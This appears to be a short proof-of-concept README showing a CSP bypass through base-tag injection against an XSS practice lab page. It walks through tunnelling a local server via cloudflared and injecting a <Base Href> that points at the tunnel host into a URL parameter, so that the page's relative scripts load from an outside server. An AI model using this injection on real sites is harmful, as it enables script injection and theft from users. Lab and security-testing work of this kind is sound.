# POC CSP Bypass via base-uri

## URL Lab:
https://x55.is/brutelogic/csp/csp-base-uri.php?p=

## Step to reproduce:
0. Copy repo & npm install
1. Run node server.js
2. Run cloudflared tunnel --url http://localhost:3000
3. Copy the trycloudflare.com url from log
4. Open https://x55.is/brutelogic/csp/csp-base-uri.php?p=
5. Add our url server to base tag, example:
```<Base Href=//harrison-approach-goat-steady.trycloudflare.com>```
6. inject to url param, all url will like this:
```https://x55.is/brutelogic/csp/csp-base-uri.php?p=<Base Href=//harrison-approach-goat-steady.trycloudflare.com>```